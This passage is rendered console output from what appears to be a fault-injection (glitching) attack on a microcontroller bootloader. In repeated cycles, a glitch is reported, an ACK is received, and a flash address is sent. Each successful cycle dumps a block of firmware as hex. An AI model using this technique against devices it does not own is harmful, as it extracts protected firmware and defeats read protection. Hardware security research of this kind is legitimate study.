+</span></span><span style="display:flex;"><span>Result: 79000001209d090008190900082109000829090008310900083909000800000000000000000000000000000000410900084f090008000000005d0900086b090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed09000800000000000000000000000000000000ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed09000800000000ed090008ed090008ed09000800000000000000000000000000000000ed0900
+</span></span><span style="display:flex;"><span>Bytes to read: 79000001209d090008190900082109000829090008310900083909000800000000000000000000000000000000410900084f090008000000005d0900086b090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed09000800000000000000000000000000000000ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed090008ed09000800000000ed090008ed090008ed09000800000000000000000000000000000000ed0900
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18319</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134217984 <span style="color:#bd93f9">0800010009</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800010009</span>
+</span></span><span style="display:flex;"><span>Result: 7900000000ed090008ed090008ed09000800000000000000000000000000000000ed090008ed090008ed090008ed090008ed090008000000000000000000000000000000000000000000000000ed090008ed090008ed090008ed090008ed090008ed090008ed09000800000000000000000000000000000000000000000000000000000000ed0900080000000000000000ed09000810b5054c237833b9044b13b10448aff300800123237010bd1c000020000000002822000808b5034b1bb103490348aff3008008bd00000000200000202822000810f8012b11f8013b012a28bf9a42f7d0d01a7047034613f8012b002afbd1181a0138704753b94ab9002908
+</span></span><span style="display:flex;"><span>Bytes to read: 7900000000ed090008ed090008ed09000800000000000000000000000000000000ed090008ed090008ed090008ed090008ed090008000000000000000000000000000000000000000000000000ed090008ed090008ed090008ed090008ed090008ed090008ed09000800000000000000000000000000000000000000000000000000000000ed0900080000000000000000ed09000810b5054c237833b9044b13b10448aff300800123237010bd1c000020000000002822000808b5034b1bb103490348aff3008008bd00000000200000202822000810f8012b11f8013b012a28bf9a42f7d0d01a7047034613f8012b002afbd1181a0138704753b94ab9002908
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18332</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134218240 080002000a
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080002000a
+</span></span><span style="display:flex;"><span>Result: 7900281cbf4ff0ff314ff0ff3000f06ab9adf1080c6de904ce00f006f8ddf804e0dde9022304b070472de9f047089d0c46002b4ed194468c458646b2fa82f262d94ab1c2f12003914020fa03f30cfa02fc194300fa02fe4fea1c471ffa8cf6b1fbf7f44fea1e4307fb141143ea014304fb06f199420ad91ceb030304f1ff3080f01281994240f20f81023c6344591a1ffa8ef3b1fbf7f007fb101143ea014300fb06f69e420ad91ceb030300f1ff3180f0fc809e4240f2f980634402389b1b40ea044000211db1d3400022c5e90032bde8f0878b4205d90db1c5e9000100210846f5e7b3fa83f1002946d1a34202d39042c0f0f080861a64eb03030120002de6
+</span></span><span style="display:flex;"><span>Bytes to read: 7900281cbf4ff0ff314ff0ff3000f06ab9adf1080c6de904ce00f006f8ddf804e0dde9022304b070472de9f047089d0c46002b4ed194468c458646b2fa82f262d94ab1c2f12003914020fa03f30cfa02fc194300fa02fe4fea1c471ffa8cf6b1fbf7f44fea1e4307fb141143ea014304fb06f199420ad91ceb030304f1ff3080f01281994240f20f81023c6344591a1ffa8ef3b1fbf7f007fb101143ea014300fb06f69e420ad91ceb030300f1ff3180f0fc809e4240f2f980634402389b1b40ea044000211db1d3400022c5e90032bde8f0878b4205d90db1c5e9000100210846f5e7b3fa83f1002946d1a34202d39042c0f0f080861a64eb03030120002de6
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18304</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134218496 080003000b
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080003000b
+</span></span><span style="display:flex;"><span>Result: 79c5e90063e3e7002a40f09080a1eb0c044fea1c481ffa8cf70121b4fbf8f64fea1e4308fb164443ea044307fb06f0984208d91ceb030306f1ff3402d2984200f2cd8026461c1a1ffa8ef3b4fbf8f008fb104443ea044300fb07f79f4208d91ceb030300f1ff3402d29f4200f2b0802046db1b40ea0640a5e7c1f120068b4022fa06f71f4320fa06fc04fa01f343ea0c03f44000fa01f8380c4fea1349b4fbf0fe1ffa87fc00fb1e4449ea04440efb0cf9a14502fa01f20ad93c190ef1ff3a80f08480a14540f28180aef1020e3c44a4eb09041ffa83f9b4fbf0f300fb134449ea044403fb0cfca44507d93c1903f1ff3067d2a44565d9023b3c4443ea0e40a0
+</span></span><span style="display:flex;"><span>Bytes to read: 79c5e90063e3e7002a40f09080a1eb0c044fea1c481ffa8cf70121b4fbf8f64fea1e4308fb164443ea044307fb06f0984208d91ceb030306f1ff3402d2984200f2cd8026461c1a1ffa8ef3b4fbf8f008fb104443ea044300fb07f79f4208d91ceb030300f1ff3402d29f4200f2b0802046db1b40ea0640a5e7c1f120068b4022fa06f71f4320fa06fc04fa01f343ea0c03f44000fa01f8380c4fea1349b4fbf0fe1ffa87fc00fb1e4449ea04440efb0cf9a14502fa01f20ad93c190ef1ff3a80f08480a14540f28180aef1020e3c44a4eb09041ffa83f9b4fbf0f300fb134449ea044403fb0cfca44507d93c1903f1ff3067d2a44565d9023b3c4443ea0e40a0
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;yy&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18325</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134218752 080004000c
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18315</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134218752 080004000c
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080004000c
+</span></span><span style="display:flex;"><span>Result: 790293a4eb0c049c42ce469c4651d34ed055b1b8eb0e0364eb0c0404fa06f6cb401e43cc40c5e90064002150e7c2f1200320fa03f10cfa02fc24fa03f394400c434fea1c4800fa02fe1ffa8cf7b3fbf8f008fb1031230c43ea014300fb07f1994208d91ceb030300f1ff362cd299422ad9023863445b1aa4b2b3fbf8f108fb113344ea034401fb07f3a34208d91ceb040401f1ff3613d2a34211d902396444e41a41ea004139e70446f0e6084606e7c845aed2b9eb020e63eb070c0138a8e73146ede7034699e73046d4e7d6467fe7634402384de70646234608460fe7023e634430e700bf704700bf80b588b000af0023fb6100237b6007f1080300221a605a
+</span></span><span style="display:flex;"><span>Bytes to read: 790293a4eb0c049c42ce469c4651d34ed055b1b8eb0e0364eb0c0404fa06f6cb401e43cc40c5e90064002150e7c2f1200320fa03f10cfa02fc24fa03f394400c434fea1c4800fa02fe1ffa8cf7b3fbf8f008fb1031230c43ea014300fb07f1994208d91ceb030300f1ff362cd299422ad9023863445b1aa4b2b3fbf8f108fb113344ea034401fb07f3a34208d91ceb040401f1ff3613d2a34211d902396444e41a41ea004139e70446f0e6084606e7c845aed2b9eb020e63eb070c0138a8e73146ede7034699e73046d4e7d6467fe7634402384de70646234608460fe7023e634430e700bf704700bf80b588b000af0023fb6100237b6007f1080300221a605a
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18370</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134219008 080005000d
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080005000d
+</span></span><span style="display:flex;"><span>Result: 799a60da6007f11b0164230122124801f098fa0346002bf5d1fb7e0d2b02d0fb7e0a2b0bd13a1dfb69134400221a703b1d184600f013f80023fb6109e0f97e3a1dfb6913440a461a70fb690133fb61d9e72037bd4680bd00bf3800002080b584b000af786001224ff48051114800f01cfd104b1b6879681846fff72cfe0346fb60fb68002b05d10c4b1b68184600f018f80ae000224ff48051054800f005fd074b1b68184600f00cf81037bd4680bd00bf00040240000000200c0000200400002080b582b000af78607868fff70dfe03469ab24ff0ff337968034801f0a7f900bf0837bd4680bd00bf3800002080b500af00f0fef900f00ef800f0a0f800f074
+</span></span><span style="display:flex;"><span>Bytes to read: 799a60da6007f11b0164230122124801f098fa0346002bf5d1fb7e0d2b02d0fb7e0a2b0bd13a1dfb69134400221a703b1d184600f013f80023fb6109e0f97e3a1dfb6913440a461a70fb690133fb61d9e72037bd4680bd00bf3800002080b584b000af786001224ff48051114800f01cfd104b1b6879681846fff72cfe0346fb60fb68002b05d10c4b1b68184600f018f80ae000224ff48051054800f005fd074b1b68184600f00cf81037bd4680bd00bf00040240000000200c0000200400002080b582b000af78607868fff70dfe03469ab24ff0ff337968034801f0a7f900bf0837bd4680bd00bf3800002080b500af00f0fef900f00ef800f0a0f800f074
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18311</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134219264 080006000e
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080006000e
+</span></span><span style="display:flex;"><span>Result: 79034b1b681846fff7dbfffff76dfffce70800002080b594b000af07f1200330220021184601f0d4fd07f10c0300221a605a609a60da601a610023bb60284b1b6c274a43f080531364254b1b6c03f08053bb60bb6800237b60224b1b6823f44043204a43f4004313601e4b1b6803f440437b607b6801233b624ff480337b620223bb634ff48003fb6310233b64c0237b640423bb640423fb6407f12003184600f09dfc0346002b01d000f0c0f80f23fb6002233b6180237b614ff48053bb610023fb6107f10c030121184600f0fffe0346002b01d000f0aaf800bf5037bd4680bd003802400070004080b500af114b124a1a60104b4ff416525a600e4b00229a
+</span></span><span style="display:flex;"><span>Bytes to read: 79034b1b681846fff7dbfffff76dfffce70800002080b594b000af07f1200330220021184601f0d4fd07f10c0300221a605a609a60da601a610023bb60284b1b6c274a43f080531364254b1b6c03f08053bb60bb6800237b60224b1b6823f44043204a43f4004313601e4b1b6803f440437b607b6801233b624ff480337b620223bb634ff48003fb6310233b64c0237b640423bb640423fb6407f12003184600f09dfc0346002b01d000f0c0f80f23fb6002233b6180237b614ff48053bb610023fb6107f10c030121184600f0fffe0346002b01d000f0aaf800bf5037bd4680bd003802400070004080b500af114b124a1a60104b4ff416525a600e4b00229a
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18365</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134219520 080007000f
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 080007000f
+</span></span><span style="display:flex;"><span>Result: 790c4b0022da600b4b00221a61094b0c225a61084b00229a61064b0022da61054801f0b4f80346002b01d000f07ff800bf80bd00bf380000200010014080b58ab000af07f1140300221a605a609a60da601a6100233b61324b1b6b314a43f0040313632f4b1b6b03f004033b613b690023fb602b4b1b6b2a4a43f080031363284b1b6b03f08003fb60fb680023bb60244b1b6b234a43f002031363214b1b6b03f00203bb60bb6800237b601d4b1b6b1c4a43f0010313631a4b1b6b03f001037b607b6801224ff40051164800f0edfb00224ff48051144800f0e7fb4ff400537b610123bb610023fb6100233b6207f1140319460c4800f054fa4ff480537b6101
+</span></span><span style="display:flex;"><span>Bytes to read: 790c4b0022da600b4b00221a61094b0c225a61084b00229a61064b0022da61054801f0b4f80346002b01d000f07ff800bf80bd00bf380000200010014080b58ab000af07f1140300221a605a609a60da601a6100233b61324b1b6b314a43f0040313632f4b1b6b03f004033b613b690023fb602b4b1b6b2a4a43f080031363284b1b6b03f08003fb60fb680023bb60244b1b6b234a43f002031363214b1b6b03f00203bb60bb6800237b601d4b1b6b1c4a43f0010313631a4b1b6b03f001037b607b6801224ff40051164800f0edfb00224ff48051144800f0e7fb4ff400537b610123bb610023fb6100233b6207f1140319460c4800f054fa4ff480537b6101
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18305</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134219776 <span style="color:#bd93f9">0800080000</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800080000</span>
+</span></span><span style="display:flex;"><span>Result: 79bb610023fb6100233b6207f114031946054800f045fa00bf2837bd4680bd00bf00380240000802400004024080b400af72b600bf00bffde780b483b000af00237b60104b5b6c0f4a43f4804353640d4b5b6c03f480437b607b6800233b60094b1b6c084a43f080531364064b1b6c03f080533b603b6800bf0c37bd465df8047b704700bf0038024080b58ab000af786007f1140300221a605a609a60da601a617b681b68194a93422cd100233b61184b5b6c174a43f010035364154b5b6c03f010033b613b690023fb60114b1b6b104a43f0010313630e4b1b6b03f00103fb60fb684ff4c0637b610223bb610023fb6103233b6207237b6207f11403194605
+</span></span><span style="display:flex;"><span>Bytes to read: 79bb610023fb6100233b6207f114031946054800f045fa00bf2837bd4680bd00bf00380240000802400004024080b400af72b600bf00bffde780b483b000af00237b60104b5b6c0f4a43f4804353640d4b5b6c03f480437b607b6800233b60094b1b6c084a43f080531364064b1b6c03f080533b603b6800bf0c37bd465df8047b704700bf0038024080b58ab000af786007f1140300221a605a609a60da601a617b681b68194a93422cd100233b61184b5b6c174a43f010035364154b5b6c03f010033b613b690023fb60114b1b6b104a43f0010313630e4b1b6b03f00103fb60fb684ff4c0637b610223bb610023fb6103233b6207237b6207f11403194605
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18320</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134220032 <span style="color:#bd93f9">0800090001</span>
+</span></span><span style="display:flex;"><span>Result 
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18303</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134220032 <span style="color:#bd93f9">0800090001</span>
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: <span style="color:#bd93f9">0800090001</span>
+</span></span><span style="display:flex;"><span>Result: 7900f0cef900bf2837bd4680bd00100140003802400000024080b400af00bffde780b400af00bffde780b400af00bffde780b400af00bffde780b400af00bffde780b400af00bfbd465df8047b704780b400af00bfbd465df8047b704780b400af00bfbd465df8047b704780b500af00f091f800bf80bd000080b400af064bd3f88830054a43f47003c2f8883000bfbd465df8047b704700bf00ed00e0dff834d0fff7eaff0c480d490d4a002302e0d458c4500433c4188c42f9d30a4a0a4c002301e013600432a242fbd301f009fcfff70dfe704700000120000000201c000020e82200081c00002084000020fee7000080b500af0e4b1b680d4a43f4007313
+</span></span><span style="display:flex;"><span>Bytes to read: 7900f0cef900bf2837bd4680bd00100140003802400000024080b400af00bffde780b400af00bffde780b400af00bffde780b400af00bffde780b400af00bffde780b400af00bfbd465df8047b704780b400af00bfbd465df8047b704780b400af00bfbd465df8047b704780b500af00f091f800bf80bd000080b400af064bd3f88830054a43f47003c2f8883000bfbd465df8047b704700bf00ed00e0dff834d0fff7eaff0c480d490d4a002302e0d458c4500433c4188c42f9d30a4a0a4c002301e013600432a242fbd301f009fcfff70dfe704700000120000000201c000020e82200081c00002084000020fee7000080b500af0e4b1b680d4a43f4007313
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18340</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134220288 08000a0002
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18341</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134220288 08000a0002
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08000a0002
+</span></span><span style="display:flex;"><span>Result: 790b4b1b680a4a43f480631360084b1b68074a43f480731360032000f00df90f2000f008f8fff708ff0023184680bd00bf003c024080b582b000af7860124b1a68124b1b7819464ff47a73b3fbf1f3b2fbf3f3184600f017f90346002b01d001230ee07b680f2b0ad8002279684ff0ff3000f0edf8064a7b681360002300e0012318460837bd4680bd10000020180000201400002080b400af064b1b781a46064b1b681344044a136000bfbd465df8047b704700bf180000208000002080b400af034b1b681846bd465df8047b704700bf8000002080b485b000af78607b6803f00703fb600c4bdb68bb60ba684ff6ff031340bb60fb681a02bb68134343f0bf
+</span></span><span style="display:flex;"><span>Bytes to read: 790b4b1b680a4a43f480631360084b1b68074a43f480731360032000f00df90f2000f008f8fff708ff0023184680bd00bf003c024080b582b000af7860124b1a68124b1b7819464ff47a73b3fbf1f3b2fbf3f3184600f017f90346002b01d001230ee07b680f2b0ad8002279684ff0ff3000f0edf8064a7b681360002300e0012318460837bd4680bd10000020180000201400002080b400af064b1b781a46064b1b681344044a136000bfbd465df8047b704700bf180000208000002080b400af034b1b681846bd465df8047b704700bf8000002080b485b000af78607b6803f00703fb600c4bdb68bb60ba684ff6ff031340bb60fb681a02bb68134343f0bf
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18329</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134220544 08000b0003
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08000b0003
+</span></span><span style="display:flex;"><span>Result: 7943f40033bb60044abb68d36000bf1437bd465df8047b704700ed00e080b400af044bdb681b0a03f007031846bd465df8047b704700ed00e080b483b000af03463960fb7197f90730002b0adb3b68dab20c4997f907301201d2b20b4483f800230ae03b68dab20849fb7903f00f03043b1201d2b20b441a7600bf0c37bd465df8047b704700e100e000ed00e080b489b000aff860b9607a60fb6803f00703fb61fb69c3f10703042b28bf0423bb61fb690433062b02d9fb69033b00e000237b614ff0ff32bb6902fa03f3da43bb681a407b699a404ff0ff317b6901fa03f3d9437b680b40134318462437bd465df8047b7047000080b582b000af78607b6801
+</span></span><span style="display:flex;"><span>Bytes to read: 7943f40033bb60044abb68d36000bf1437bd465df8047b704700ed00e080b400af044bdb681b0a03f007031846bd465df8047b704700ed00e080b483b000af03463960fb7197f90730002b0adb3b68dab20c4997f907301201d2b20b4483f800230ae03b68dab20849fb7903f00f03043b1201d2b20b441a7600bf0c37bd465df8047b704700e100e000ed00e080b489b000aff860b9607a60fb6803f00703fb61fb69c3f10703042b28bf0423bb61fb690433062b02d9fb69033b00e000237b614ff0ff32bb6902fa03f3da43bb681a407b699a404ff0ff317b6901fa03f3d9437b680b40134318462437bd465df8047b7047000080b582b000af78607b6801
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18313</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134220800 08000c0004
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08000c0004
+</span></span><span style="display:flex;"><span>Result: 79b3f1807f01d301230fe00a4a7b68013b53600f214ff0ff30fff78eff054b00229a60044b07221a60002318460837bd4680bd00bf10e000e080b582b000af78607868fff747ff00bf0837bd4680bd80b586b000af0346b9607a60fb7300237b61fff75cff78617a68b9687869fff78eff024697f90f3011461846fff75dff00bf1837bd4680bd80b582b000af78607868fff7b0ff034618460837bd4680bd000080b489b000af7860396000237b6100233b610023bb610023fb6159e10122fb6902fa03f37b613b681b687a6913403b613a697b699a4240f048813b685b6803f00303012b05d03b685b6803f00303022b30d17b689b68bb61fb695b00032202
+</span></span><span style="display:flex;"><span>Bytes to read: 79b3f1807f01d301230fe00a4a7b68013b53600f214ff0ff30fff78eff054b00229a60044b07221a60002318460837bd4680bd00bf10e000e080b582b000af78607868fff747ff00bf0837bd4680bd80b586b000af0346b9607a60fb7300237b61fff75cff78617a68b9687869fff78eff024697f90f3011461846fff75dff00bf1837bd4680bd80b582b000af78607868fff7b0ff034618460837bd4680bd000080b489b000af7860396000237b6100233b610023bb610023fb6159e10122fb6902fa03f37b613b681b687a6913403b613a697b699a4240f048813b685b6803f00303012b05d03b685b6803f00303022b30d17b689b68bb61fb695b00032202
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18340</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221056 08000d0005
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
+</span></span><span style="display:flex;"><span>Ack, <span style="color:#8be9fd;font-style:italic">read</span> the memory address: 08000d0005
+</span></span><span style="display:flex;"><span>Result: 7903f3db43ba691340bb613b68da68fb695b0002fa03f3ba691343bb617b68ba699a607b685b68bb610122fb6902fa03f3db43ba691340bb613b685b681b0903f00102fb6902fa03f3ba691343bb617b68ba695a603b685b6803f00303032b17d07b68db68bb61fb695b00032202fa03f3db43ba691340bb613b689a68fb695b0002fa03f3ba691343bb617b68ba69da603b685b6803f00303022b23d1fb69da087b68083253f82230bb61fb6903f007039b000f2202fa03f3db43ba691340bb613b681a69fb6903f007039b0002fa03f3ba691343bb61fb69da087b680832b96943f822107b681b68bb61fb695b00032202fa03f3db43ba691340bb613b685b
+</span></span><span style="display:flex;"><span>Bytes to read: 7903f3db43ba691340bb613b68da68fb695b0002fa03f3ba691343bb617b68ba699a607b685b68bb610122fb6902fa03f3db43ba691340bb613b685b681b0903f00102fb6902fa03f3ba691343bb617b68ba695a603b685b6803f00303032b17d07b68db68bb61fb695b00032202fa03f3db43ba691340bb613b689a68fb695b0002fa03f3ba691343bb617b68ba69da603b685b6803f00303022b23d1fb69da087b68083253f82230bb61fb6903f007039b000f2202fa03f3db43ba691340bb613b681a69fb6903f007039b0002fa03f3ba691343bb61fb69da087b680832b96943f822107b681b68bb61fb695b00032202fa03f3db43ba691340bb613b685b
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;yy&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18361</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221312 08000e0006
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;yy&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18301</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221312 08000e0006
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;yy&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18331</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221312 08000e0006
+</span></span><span style="display:flex;"><span>Result 1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18324</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221312 08000e0006
+</span></span><span style="display:flex;"><span>Result 1f1f1f
+</span></span><span style="display:flex;"><span>Glitched
+</span></span><span style="display:flex;"><span>b<span style="color:#f1fa8c">&#39;y&#39;</span>
+</span></span><span style="display:flex;"><span>Got ack
+</span></span><span style="display:flex;"><span>Can <span style="color:#8be9fd;font-style:italic">read</span> the memory:  1.953125 10.15625 <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">18324</span>
+</span></span><span style="display:flex;"><span>Sending memory address :134221312 08000e0006
+</span></span><span style="display:flex;"><span>Result <span style="color:#bd93f9">79</span>
